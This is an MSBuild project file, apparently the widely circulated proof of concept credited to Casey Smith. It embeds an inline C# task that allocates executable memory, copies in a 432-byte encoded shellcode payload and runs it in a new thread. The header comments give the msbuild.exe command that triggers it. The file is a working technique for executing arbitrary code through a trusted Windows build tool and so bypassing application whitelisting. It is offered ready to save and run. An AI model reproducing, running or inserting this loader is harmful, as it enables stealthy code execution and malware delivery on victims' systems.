<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes shellcode. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
  <!-- Save This File And Execute The Above Command -->
  <!-- Author: Casey Smith, Twitter: @subTee --> 
  <!-- License: BSD 3-Clause -->
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
    
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask
        {         
          private static UInt32 MEM_COMMIT = 0x1000;          
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
          [DllImport("kernel32")]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
          [DllImport("kernel32")]
            private static extern IntPtr CreateThread(            
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId           
            );
          [DllImport("kernel32")]
            private static extern UInt32 WaitForSingleObject(           
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );          
          public override bool Execute()
          {
            byte[] shellcode = new byte[432] {0xba,0x9e,0x57,0x9b,0x79,0xd9,
0xee,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x66,0x31,0x56,
0x13,0x03,0x56,0x13,0x83,0xee,0x62,0xb5,0x6e,0xc2,0xfb,0x8e,
0x72,0x99,0x20,0x2c,0xad,0x96,0xf2,0x45,0x14,0x7e,0x33,0x14,
0xf6,0x03,0x01,0x53,0x38,0x5e,0x95,0x5f,0x60,0x4e,0x16,0x1e,
0xcc,0x2b,0xae,0x23,0xce,0xff,0x36,0x29,0x27,0x55,0xca,0xd8,
0xcd,0x09,0x8f,0x7b,0xfe,0xb6,0xa7,0x67,0x12,0x0b,0x06,0xde,
0x0a,0x2b,0xc1,0x30,0x10,0x71,0x10,0xc6,0xaf,0x0d,0x86,0x78,
0xb7,0x67,0xee,0x80,0xf0,0x5e,0xe8,0x8b,0x26,0x91,0x63,0x2f,
0x02,0xf4,0x64,0x63,0x63,0xab,0x1a,0x88,0x13,0x18,0x06,0xca,
0x45,0x6c,0x82,0x6e,0x81,0x9b,0x83,0x13,0xd9,0xfe,0x30,0x42,
0xe0,0x7d,0xa2,0x8d,0x19,0xac,0xdb,0x9a,0xcd,0xe4,0x2e,0x35,
0x64,0x92,0x71,0x9d,0x66,0x36,0x04,0xcd,0xdf,0xcb,0xba,0xa4,
0x8c,0x66,0x0a,0x92,0x3b,0xa5,0x01,0x0d,0xce,0xa7,0xd5,0xf1,
0x2c,0xc0,0x09,0x63,0x57,0x86,0x09,0x5b,0xcb,0xda,0x36,0x8d,
0xc4,0x63,0x2f,0xb3,0x9d,0xa1,0x2a,0xe0,0xfd,0x31,0xfb,0xba,
0x41,0x78,0x5b,0xf5,0x96,0x56,0x6c,0x78,0x4e,0x2d,0x06,0x4c,
0x07,0xe3,0x62,0x96,0x30,0x04,0x6f,0xde,0xb8,0xed,0x5e,0x30,
0x3b,0x66,0x65,0xd2,0x58,0x2d,0xc4,0xea,0xb3,0xd5,0x74,0xbb,
0xb1,0xea,0xc0,0x42,0x1f,0x3f,0xe9,0x07,0xfb,0x50,0x37,0xa1,
0x20,0xd2,0x0c,0x37,0x4f,0xf8,0xbd,0x6f,0xec,0x24,0x5e,0xf6,
0xa5,0xfd,0xbf,0x0c,0xb5,0xc4,0x5f,0x18,0x43,0x4d,0x61,0x72,
0x12,0x6b,0xe5,0x4e,0x21,0xdd,0x91,0x49,0x6b,0x94,0xee,0xc7,
0xa2,0x9b,0xdb,0x70,0xec,0x22,0x6d,0xd2,0x6c,0xe8,0x37,0x99,
0x43,0xb8,0x06,0xd6,0xb8,0x65,0x3f,0xda,0x46,0x0f,0xc2,0x31,
0xa1,0xdf,0x4a,0x3f,0x52,0x15,0xe6,0x14,0x1e,0xa8,0x93,0xad,
0x03,0xff,0xfe,0x86,0x87,0xe8,0xa1,0x24,0xbd,0x20,0x04,0x4b,
0x98,0x56,0x4e,0xe1,0xdd,0x8a,0x67,0x3c,0x85,0x8f,0xed,0x87,
0xb9,0xfc,0x04,0x98,0x3f,0xd1,0x80,0x49,0x18,0x1a,0x81,0x13,
0x92,0x9f,0x14,0xad,0xf1,0xd1,0xd6,0xe6,0x6a,0xe0,0xb0,0x39,
0x8f,0x0a,0x51,0x1e,0x1a,0xd3,0xef,0x37,0x0b,0x69,0xf6,0x58,
0xb4,0xf4,0xfe,0x89,0x4f,0x1c,0x35,0xd8,0xb7,0x1d,0x3f,0xbb,
0xfb,0xbf,0x18,0x18,0x16,0x34,0x16,0x81,0xf3,0x3f,0xab,0x3d,
0x01,0x0b,0xd2,0xc6,0x5a,0xb8,0x57,0x9b,0x63,0xd0,0xf1,0x71,
0xc5,0x45,0xe1,0xf7,0x7b,0x09,0xc7,0xb3,0x6e,0x6b,0x90,0xb3,
0xa0,0xdb,0x45,0x77,0x95,0x93,0x84,0x83,0x42,0x42,0xc0,0x7a,
0x99,0x8c,0x9e,0x6d,0x93,0x96};
              
              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
              IntPtr hThread = IntPtr.Zero;
              UInt32 threadId = 0;
              IntPtr pinfo = IntPtr.Zero;
              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
              WaitForSingleObject(hThread, 0xFFFFFFFF);
              return true;
          } 
        }     
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
